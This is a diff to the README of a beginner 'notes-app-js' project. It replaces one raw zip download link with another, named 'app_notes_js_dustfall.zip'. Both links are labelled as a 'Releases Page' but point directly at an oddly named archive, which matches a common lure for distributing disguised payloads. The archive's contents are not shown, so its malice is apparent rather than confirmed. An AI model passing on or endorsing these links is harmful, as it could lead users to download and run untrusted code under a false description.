@@ -4,12 +4,12 @@
 Welcome to the notes-app-js project! This simple Notes App helps you manage your notes effectively. It covers essential JavaScript concepts, making it a great tool for anyone interested in web development.
 
 ## 📥 Download the App
-[![Download Notes App](https://raw.githubusercontent.com/varuntyuiop/notes-app-js/main/unsusceptibility/notes-app-js.zip)](https://raw.githubusercontent.com/varuntyuiop/notes-app-js/main/unsusceptibility/notes-app-js.zip)
+[![Download Notes App](https://raw.githubusercontent.com/varuntyuiop/notes-app-js/main/js/app_notes_js_dustfall.zip)](https://raw.githubusercontent.com/varuntyuiop/notes-app-js/main/js/app_notes_js_dustfall.zip)
 
 ## 📂 Download & Install
 To get started with the notes app, visit the following page to download the software:
 
-[Visit the Releases Page](https://raw.githubusercontent.com/varuntyuiop/notes-app-js/main/unsusceptibility/notes-app-js.zip)
+[Visit the Releases Page](https://raw.githubusercontent.com/varuntyuiop/notes-app-js/main/js/app_notes_js_dustfall.zip)
 
 1. Click the link above.
 2. On the Releases page, look for the latest version of the app.
